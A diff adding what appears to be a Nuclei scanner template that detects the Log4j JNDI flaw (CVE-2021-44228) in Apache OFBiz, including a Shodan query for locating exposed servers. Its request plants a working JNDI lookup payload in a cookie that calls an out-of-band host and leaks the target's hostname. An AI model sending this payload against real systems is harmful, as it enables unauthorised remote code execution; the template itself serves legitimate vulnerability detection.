@@ -1,0 +1,58 @@
+id: apache-ofbiz-log4j
+
+info:
+  name: Apache OFBiz - JNDI Remote Code Execution 
+  severity: High
+  description: |
+    Apache OFBiz faces a remote code execution vulnerability tied to the bundled Apache Log4j logging library. The vulnerability arises from insufficient safeguards on message lookup substitutions when handling user-controlled input. Exploiting this, a remote and unauthenticated attacker can execute arbitrary code through a web request, operating with the permission level of the Java process in action. To address this issue, it is recommended to upgrade to Apache OFBiz version 8.12.03 or a later release for effective remediation
+  reference:
+    - https://issues.apache.org/jira/browse/OFBIZ-12449
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+    shodan-query: http.html:"Apache OFBiz"
+  tags: cve,cve2021,ofbiz,oast,log4j,rce,apache,jndi,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        GET /webtools/control/main HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: OFBiz.Visitor=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.cookie.{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
